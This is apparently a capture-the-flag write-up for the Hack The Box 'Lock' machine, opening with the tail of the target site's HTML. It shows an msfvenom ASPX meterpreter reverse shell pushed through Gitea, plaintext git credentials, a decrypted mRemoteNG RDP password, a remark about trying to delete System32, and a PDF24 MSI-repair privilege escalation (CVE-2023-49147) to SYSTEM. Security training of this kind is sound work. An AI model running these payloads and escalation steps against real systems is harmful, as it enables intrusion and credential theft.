         <p>Ensure the integrity of your documents with robust PDF protection features, including password encryption and access restrictions.</p>  
       </div>  
       <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-pencil"></i>  
         <h4>Sign PDF</h4>  
         <p>Digitally sign PDF documents with ease, providing a secure and legal way to validate and authorize documents electronically.</p>  
       </div>  
     </div>  
   </div>  
  
 </div>  
</section><!-- End Features Section -->  
  
  
  
   <!-- ======= Counts Section ======= -->  
<section id="counts" class="counts">  
 <div class="container" data-aos="fade-up">  
  
   <div class="row no-gutters">  
     <div class="image col-xl-5 d-flex align-items-stretch justify-content-center justify-content-lg-start" data-aos="fade-right" data-aos-delay="100"></div>  
     <div class="col-xl-7 ps-4 ps-lg-5 pe-4 pe-lg-1 d-flex align-items-stretch" data-aos="fade-left" data-aos-delay="100">  
       <div class="content d-flex flex-column justify-content-center">  
         <h3>Empowering Businesses with Efficient Document Solutions</h3>  
         <p>  
           Our commitment to excellence in PDF and document management has led to significant achievements. We take pride in our contributions to enhancing productivity and security in document handling.  
         </p>  
         <div class="row">  
           <div class="col-md-6 d-md-flex align-items-md-stretch">  
             <div class="count-box">  
               <i class="bi bi-emoji-smile"></i>  
               <span data-purecounter-start="0" data-purecounter-end="228" data-purecounter-duration="2" class="purecounter"></span>  
               <p><strong>Happy Clients</strong> who trust our solutions for their document management needs.</p>  
             </div>  
           </div>  
  
           <div class="col-md-6 d-md-flex align-items-md-stretch">  
             <div class="count-box">  
               <i class="bi bi-journal-richtext"></i>  
               <span data-purecounter-start="0" data-purecounter-end="542" data-purecounter-duration="2" class="purecounter"></span>  
               <p><strong>Projects Completed</strong> including PDF conversions, OCR, and document security enhancements.</p>  
             </div>  
           </div>  
  
           <div class="col-md-6 d-md-flex align-items-md-stretch">  
             <div class="count-box">  
               <i class="bi bi-clock"></i>  
               <span data-purecounter-start="0" data-purecounter-end="3" data-purecounter-duration="4" class="purecounter"></span>  
               <p><strong>Years of Experience</strong> in delivering top-notch document management solutions.</p>  
             </div>  
           </div>  
  
           <div class="col-md-6 d-md-flex align-items-md-stretch">  
             <div class="count-box">  
               <i class="bi bi-award"></i>  
               <span data-purecounter-start="0" data-purecounter-end="2" data-purecounter-duration="4" class="purecounter"></span>  
               <p><strong>Awards and Recognition</strong> received for innovation and excellence in document management.</p>  
             </div>  
           </div>  
         </div>  
       </div><!-- End .content-->  
     </div>  
   </div>  
  
 </div>  
</section><!-- End Counts Section -->  
  
  
   <!-- ======= Testimonials Section ======= -->  
<section id="testimonials" class="testimonials">  
 <div class="container" data-aos="zoom-in">  
  
   <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">  
     <div class="swiper-wrapper">  
  
       <div class="swiper-slide">  
         <div class="testimonial-item">  
           <img src="assets/img/testimonials/testimonials-1.jpg" class="testimonial-img" alt="">  
           <h3>Saul Goodman</h3>  
           <h4>Legal Consultant</h4>  
           <p>  
             <i class="bx bxs-quote-alt-left quote-icon-left"></i>  
             "Using Lock's PDF OCR tool transformed how we handle case files. We can now quickly convert scanned documents into searchable formats, significantly enhancing our efficiency."  
             <i class="bx bxs-quote-alt-right quote-icon-right"></i>  
           </p>  
         </div>  
       </div><!-- End testimonial item -->  
  
       <div class="swiper-slide">  
         <div class="testimonial-item">  
           <img src="assets/img/testimonials/testimonials-2.jpg" class="testimonial-img" alt="">  
           <h3>Sara Wilsson</h3>  
           <h4>Academic Researcher</h4>  
           <p>  
             <i class="bx bxs-quote-alt-left quote-icon-left"></i>  
             "I regularly use Lock's PDF to Word conversion for my research. It's a game changer in terms of accessibility and editing capabilities for large volumes of data."  
             <i class="bx bxs-quote-alt-right quote-icon-right"></i>  
           </p>  
         </div>  
       </div><!-- End testimonial item -->  
  
       <div class="swiper-slide">  
         <div class="testimonial-item">  
           <img src="assets/img/testimonials/testimonials-5.jpg" class="testimonial-img" alt="">  
           <h3>John Larson</h3>  
           <h4>Entrepreneur</h4>  
           <p>  
             <i class="bx bxs-quote-alt-left quote-icon-left"></i>  
             "The Redact PDF feature from Lock has been instrumental in protecting our sensitive business information. It's easy to use and incredibly reliable."  
             <i class="bx bxs-quote-alt-right quote-icon-right"></i>  
           </p>  
         </div>  
       </div><!-- End testimonial item -->  
     </div>  
     <div class="swiper-pagination"></div>  
   </div>  
  
 </div>  
</section><!-- End Testimonials Section -->  
  
  
 </main><!-- End #main -->  
  
 <!-- ======= Footer ======= -->  
 <footer id="footer">  
   <div class="footer-top">  
   <div class="container">  
     <div class="copyright">  
       &copy; Copyright <strong><span>Gp</span></strong>. All Rights Reserved  
     </div>  
     <div class="credits">  
       <!-- All the links in the footer should remain intact. -->  
       <!-- You can delete the links only if you purchased the pro version. -->  
       <!-- Licensing information: https://bootstrapmade.com/license/ -->  
       <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/ -->  
       Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>  
     </div>  
   </div>  
 </footer><!-- End Footer -->  
  
 <div id="preloader"></div>  
 <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>  
  
 <!-- Vendor JS Files -->  
 <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>  
 <script src="assets/vendor/aos/aos.js"></script>  
 <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>  
 <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>  
 <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>  
 <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>  
 <script src="assets/vendor/php-email-form/validate.js"></script>  
  
 <!-- Template Main JS File -->  
 <script src="assets/js/main.js"></script>  
  
</body>  
  
</html>%
```

```bash
>  echo '<p>deploy_test</p>' > deploy_test.html  
git config user.email "ellen.freeman@lock.vl"  
git config user.name "ellen.freeman"  
git add deploy_test.html  
git commit -m "deploy test"  
git push origin main  
curl -sL http://lock.htb/deploy_test.html  
[main e26411b] deploy test  
1 file changed, 1 insertion(+)  
create mode 100644 deploy_test.html  
Enumerating objects: 4, done.  
Counting objects: 100% (4/4), done.  
Delta compression using up to 8 threads  
Compressing objects: 100% (2/2), done.  
Writing objects: 100% (3/3), 286 bytes | 286.00 KiB/s, done.  
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)  
remote: . Processing 1 references  
remote: Processed 1 references in total  
To http://lock.htb:3000/ellen.freeman/website.git  
  73cdcc1..e26411b  main -> main  
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">  
<html xmlns="http://www.w3.org/1999/xhtml">  
<head>  
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>  
<title>404 - File or directory not found.</title>  
<style type="text/css">  
<!--  
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}  
fieldset{padding:0 15px 10px 15px;}    
h1{font-size:2.4em;margin:0;color:#FFF;}  
h2{font-size:1.7em;margin:0;color:#CC0000;}    
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}    
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;  
background-color:#555555;}  
#content{margin:0 0 0 2%;position:relative;}  
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}  
-->  
</style>  
</head>  
<body>  
<div id="header"><h1>Server Error</h1></div>  
<div id="content">  
<div class="content-container"><fieldset>  
 <h2>404 - File or directory not found.</h2>  
 <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>  
</fieldset></div>  
</div>  
</body>  
</html>  
```

And when we go on `http://lock.htb/deploy_test.html` we have a page that says `deploy_test` in pure html. The default http port is 80, as 3000 was the gitea repository for the website.

So now we try to reverse shell :

```bash
>  LHOST=$(ip route get 10.129.1.185 | grep -oP '(?<=src )\d+(\.\d+){3}')  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o rev.aspx  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x64 from the payload  
No encoder specified, outputting raw payload  
Payload size: 509 bytes  
Final size of aspx file: 3627 bytes  
Saved as: rev.aspx
>  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; run"  
  
[*] Using configured payload generic/shell_reverse_tcp  
PAYLOAD => windows/x64/meterpreter/reverse_tcp  
LHOST => 10.10.14.12  
LPORT => 4444  
[*] Started reverse TCP handler on 10.10.14.12:4444
```

Then, on another terminal :

```bash
git add rev.aspx
git commit -m "rev.aspx v2"
git push origin main
sleep 10
curl -s "http://lock.htb/rev.aspx"
```

And we got the reverse shell.

```bash
[*] Sending stage (248902 bytes) to 10.129.1.185  
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.1.185:64747) at 2026-05-22 10:20:42 +0200  
  
meterpreter > sessions 1  
[*] Session 1 is already interactive.  
meterpreter > ls  
Listing: c:\windows\system32\inetsrv  
====================================  
  
Mode              Size     Type  Last modified              Name  
----              ----     ----  -------------              ----  
100666/rw-rw-rw-  192512   fil   2025-04-16 02:47:05 +0200  AppHostNavigators.dll  
100777/rwxrwxrwx  143360   fil   2025-04-16 02:47:06 +0200  InetMgr.exe  
100666/rw-rw-rw-  147456   fil   2025-04-16 02:47:07 +0200  Microsoft.Web.Administration.dll  
100666/rw-rw-rw-  1056768  fil   2023-12-27 19:27:26 +0100  Microsoft.Web.Management.dll  
100666/rw-rw-rw-  188416   fil   2025-04-16 02:47:05 +0200  XPath.dll  
100777/rwxrwxrwx  143360   fil   2025-04-16 02:47:53 +0200  appcmd.exe  
100666/rw-rw-rw-  3940     fil   2021-05-08 10:16:02 +0200  appcmd.xml  
100666/rw-rw-rw-  94208    fil   2023-12-27 19:27:26 +0100  apphostsvc.dll  
100666/rw-rw-rw-  450560   fil   2025-04-16 02:47:53 +0200  appobj.dll  
100777/rwxrwxrwx  155648   fil   2025-04-16 02:47:52 +0200  aspnetca.exe  
100666/rw-rw-rw-  69632    fil   2025-04-16 02:47:07 +0200  authanon.dll  
100666/rw-rw-rw-  49152    fil   2025-04-16 02:47:07 +0200  cachfile.dll  
100666/rw-rw-rw-  77824    fil   2025-04-16 02:47:07 +0200  cachhttp.dll  
100666/rw-rw-rw-  36864    fil   2025-04-16 02:47:07 +0200  cachtokn.dll  
100666/rw-rw-rw-  36864    fil   2025-04-16 02:47:07 +0200  cachuri.dll  
100666/rw-rw-rw-  77824    fil   2023-12-27 19:27:26 +0100  compstat.dll  
040777/rwxrwxrwx  4096     dir   2023-12-27 19:27:27 +0100  config  
100666/rw-rw-rw-  73728    fil   2023-12-27 19:27:26 +0100  custerr.dll  
100666/rw-rw-rw-  45056    fil   2023-12-27 19:27:25 +0100  defdoc.dll  
100666/rw-rw-rw-  45056    fil   2023-12-27 19:27:25 +0100  dirlist.dll  
040777/rwxrwxrwx  0        dir   2023-12-27 19:27:27 +0100  en  
040777/rwxrwxrwx  4096     dir   2023-12-27 19:27:27 +0100  en-US  
100666/rw-rw-rw-  94208    fil   2023-12-27 22:56:49 +0100  filter.dll  
100666/rw-rw-rw-  61440    fil   2023-12-27 19:27:26 +0100  gzip.dll  
100666/rw-rw-rw-  40960    fil   2023-12-27 19:27:26 +0100  httpmib.dll  
100666/rw-rw-rw-  40960    fil   2025-04-16 02:47:53 +0200  hwebcore.dll  
100666/rw-rw-rw-  63105    fil   2023-12-27 19:27:26 +0100  iis.msc  
100666/rw-rw-rw-  356352   fil   2025-04-16 02:47:53 +0200  iiscore.dll  
100666/rw-rw-rw-  126976   fil   2025-04-16 02:47:52 +0200  iisreg.dll  
100666/rw-rw-rw-  241664   fil   2025-04-16 02:47:53 +0200  iisres.dll  
100777/rwxrwxrwx  57344    fil   2025-04-16 02:47:52 +0200  iisrstas.exe  
100777/rwxrwxrwx  217088   fil   2025-04-16 02:47:53 +0200  iissetup.exe  
100666/rw-rw-rw-  77824    fil   2025-04-16 02:47:53 +0200  iissyspr.dll  
100777/rwxrwxrwx  14848    fil   2023-12-27 19:27:25 +0100  iisual.exe  
100666/rw-rw-rw-  323584   fil   2025-04-16 02:47:53 +0200  iisutil.dll  
100666/rw-rw-rw-  630784   fil   2023-12-27 19:27:26 +0100  iisw3adm.dll  
100666/rw-rw-rw-  159744   fil   2025-04-16 02:47:07 +0200  isapi.dll  
100666/rw-rw-rw-  65536    fil   2023-12-27 19:27:26 +0100  loghttp.dll  
100666/rw-rw-rw-  65536    fil   2025-08-07 22:50:34 +0200  modrqflt.dll  
100666/rw-rw-rw-  532480   fil   2025-04-16 02:47:53 +0200  nativerd.dll  
100666/rw-rw-rw-  49152    fil   2023-12-27 19:27:26 +0100  protsup.dll  
100666/rw-rw-rw-  57344    fil   2025-04-16 02:47:53 +0200  rsca.dll  
100666/rw-rw-rw-  73728    fil   2025-04-16 02:47:53 +0200  rscaext.dll  
100666/rw-rw-rw-  65536    fil   2023-12-27 19:27:25 +0100  static.dll  
100666/rw-rw-rw-  208896   fil   2025-04-16 02:47:52 +0200  uihelper.dll  
100666/rw-rw-rw-  40960    fil   2025-04-16 02:47:05 +0200  validcfg.dll  
100666/rw-rw-rw-  40960    fil   2025-04-16 02:47:53 +0200  w3ctrlps.dll  
100666/rw-rw-rw-  53248    fil   2023-12-27 19:27:26 +0100  w3ctrs.dll  
100666/rw-rw-rw-  139264   fil   2025-04-16 02:47:53 +0200  w3dt.dll  
100666/rw-rw-rw-  110592   fil   2023-12-27 19:27:26 +0100  w3logsvc.dll  
100666/rw-rw-rw-  49152    fil   2023-12-27 19:27:26 +0100  w3tp.dll  
100777/rwxrwxrwx  45056    fil   2023-12-27 19:27:26 +0100  w3wp.exe  
100666/rw-rw-rw-  102400   fil   2023-12-27 19:27:26 +0100  w3wphost.dll  
100666/rw-rw-rw-  49152    fil   2023-12-27 19:27:26 +0100  wbhst_pm.dll  
100666/rw-rw-rw-  53248    fil   2023-12-27 19:27:26 +0100  wbhstipm.dll  
  
meterpreter > getuid  
Server username: LOCK\ellen.freeman
  
meterpreter > cd C:\\Users  
meterpreter > ls  
Listing: C:\Users  
=================  
  
Mode              Size  Type  Last modified              Name  
----              ----  ----  -------------              ----  
040777/rwxrwxrwx  8192  dir   2023-12-27 23:00:12 +0100  .NET v4.5  
040777/rwxrwxrwx  8192  dir   2023-12-27 23:00:11 +0100  .NET v4.5 Classic  
040777/rwxrwxrwx  8192  dir   2023-12-27 21:01:37 +0100  Administrator  
040777/rwxrwxrwx  0     dir   2021-05-08 10:34:03 +0200  All Users  
040555/r-xr-xr-x  8192  dir   2023-12-28 03:14:34 +0100  Default  
040777/rwxrwxrwx  0     dir   2021-05-08 10:34:03 +0200  Default User  
040555/r-xr-xr-x  4096  dir   2023-12-27 19:21:37 +0100  Public  
100666/rw-rw-rw-  174   fil   2021-05-08 10:18:31 +0200  desktop.ini  
040777/rwxrwxrwx  8192  dir   2023-12-28 20:36:34 +0100  ellen.freeman  
040777/rwxrwxrwx  8192  dir   2023-12-28 15:14:54 +0100  gale.dekarios
```

Then, inside the shell :

```cmd
C:\Users\ellen.freeman>type .git-credentials  
type .git-credentials  
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
C:\Users\ellen.freeman>net user  
net user  
  
User accounts for \\LOCK  
  
-------------------------------------------------------------------------------  
Administrator            DefaultAccount           ellen.freeman               
gale.dekarios            Guest                    WDAGUtilityAccount          
The command completed successfully.  
  
  
C:\Users\ellen.freeman>cd Documents  
cd Documents  
  
C:\Users\ellen.freeman\Documents>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is 8592-A9D9  
  
Directory of C:\Users\ellen.freeman\Documents  
  
12/28/2023  06:59 AM    <DIR>          .  
12/28/2023  12:36 PM    <DIR>          ..  
12/28/2023  06:59 AM             3,341 config.xml  
              1 File(s)          3,341 bytes  
              2 Dir(s)   5,727,461,376 bytes free  
  
C:\Users\ellen.freeman\Documents>type config.xml  
type config.xml  
<?xml version="1.0" encoding="utf-8"?>  
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8Bc  
tmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">  
   <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdD  
X+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStren  
gth="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="  
false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false  
" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAu  
thMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="N  
ever" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" Inher  
itDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword=  
"false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" Inherit  
RedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRen  
deringEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan  
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuth  
Mode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="f  
alse" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="  
false" InheritRDGatewayDomain="false" />  
</mrng:Connections>  
```

Since we cannot find the user.txt flag and we found that the actual users are `User accounts for \\LOCK   Administrator            DefaultAccount           ellen.freeman               gale.dekarios            Guest                    WDAGUtilityAccount` 

We can probably guess that the user file is in gale.dekarios, not in ellen.freeman.

```meterpreter
meterpreter > download C:\\Users\\ellen.freeman\\Documents\\config.xml /tmp/lock-config.xml  
[*] Downloading: C:\Users\ellen.freeman\Documents\config.xml -> /tmp/lock-config.xml/config.xml  
[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): C:\Users\ellen.freeman\Documents\config.xml -> /tmp/lock-config.xml/config.xml  
[*] Completed  : C:\Users\ellen.freeman\Documents\config.xml -> /tmp/lock-config.xml/config.xml
```

We downloaded the config.xml file, now we need to decrypt it :

```bash
> python3 ~/tools/mRemoteNG_password_decrypt/mremoteng_decrypt.py /tmp/lock-config.xml/config.xml  
  
Name: RDP/Gale  
Hostname: Lock  
Username: Gale.Dekarios  
Password: ty8wnW9qCKDosXo6

> xfreerdp3 /v:10.129.1.185 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore
```

We arrive on a Windows 10 desktop.
Of course, my first reflex is to `cd \` and then `del \Windows\System32\` unfortunately permission got denied.
So we resort to the user.txt on the desktop : 2***************a77f

On cmd on the RDP session :

`C:\_install dir` shows only firefox, remoteRDP and PDF24creator

I reconnect to the RDP session with `xfreerdp3 /v:10.129.1.185 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore +clipbloard`

Then I reconnect with `xfreerdp3 /v:10.129.1.185 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore +clipboard /drive:share,$HOME/htb/lock`

After some exploration, we copy `C\_install` into our shared directories and append PDF24 because the version file that is indicated for this software can be abused.

```PowerShell
C:\_install>dir
 Volume in drive C has no label.
 Volume Serial Number is 8592-A9D9

 Directory of C:\_install

12/28/2023  12:21 PM        60,804,608 Firefox Setup 121.0.msi
12/28/2023  06:39 AM        43,593,728 mRemoteNG-Installer-1.76.20.24615.msi
12/14/2023  11:07 AM       462,602,240 pdf24-creator-11.15.1-x64.msi
```

Version 11.15.1 for x64 (x86_x64) Windows 10.

```PowerShell
C:\>dir C:\_install > \\tsclient\share\enum.txt

C:\>dir "C:\Program Files\PDF24" >> \\tsclient\share\enum.txt
```

So we look for a CVE for pdf24-creator-11.15.1-x64.msi, we easily found with a simple browser search CVE-2023-49147 which allows for Privilege Escalation using the .msi installer for this specific software.

```bash
mkdir -p ~/htb/lock/tools && cd ~/htb/lock/tools

wget -q https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z

7z x Release.7z SetOpLock.exe -y

ls -la SetOpLock.exe
```

Good for us, we already have a shared user file which is `$HOME/htb/lock` between user gale and me. That lets me transfer the .exe directly to his file.

```bash
cp SetOpLock.exe ~/htb/lock/
```

Back on the Remote Desktop :

```PowerShell
C:\>cd \\tsclient\share\
'\\tsclient\share\'
CMD does not support UNC paths as current directories.

C:\>copy \\tsclient\share\SetOpLock.exe C:\Users\gale.dekarios\Desktop\SetOpLock.exe
        1 file(s) copied.
```

Then on the first cmd, we block the software :

```PowerShell
C:\>cd \Users\gale.dekarios\Desktop

C:\Users\gale.dekarios\Desktop>SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" -r
```

On the second cmd, we initiate "repair" as SYSTEM by default , SetOpLock was just the bait to make the SYSTEM repair come out :

```PowerShell
C:\Users\gale.dekarios>cd \

C:\>msiexec /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

It opened a third window, "repairing the install" which then froze and I couldn't `whoami` inside. I opened legacy mode on the black command-like terminal and chose Firefox to open it, linked me to `https://go.microsoft.com/fwlink/?LinkId=871150`

"Hmm. We’re having trouble finding that site.

We can’t connect to the server at go.microsoft.com.

If you entered the right address, you can:

    Try again later
    Check your network connection
    Check that Firefox has permission to access the web (you might be connected but behind a firewall)"

So I Ctrl+O (opened file) and tried to open cmd.exe as a file to no avail, then I tried to paste `C:\Windows\System32\cmd.exe` inside the dir after Ctrl+O

And it succeeded : the .msi repair `/fa` ran with SYSTEM privileges, and although the repair didn't give me direct root access via the terminal, I could use the legacy mode and open it through Firefox and then re-open cmd via `\Windows\System32` using the pathway from the SYSTEM authority in the PDF24 repair.

Then, copy by hand even though `+clipboard` is in the RDP arguments because the Administrator CMD is legacy and doesn't support copy/pasting.

```PowerShell
C:\Windows\System32>whoami
nt authority\system
C:\Windows\System32>type \Users\Administrator\Desktop\root.txt
54f49***************5fd5b2
```
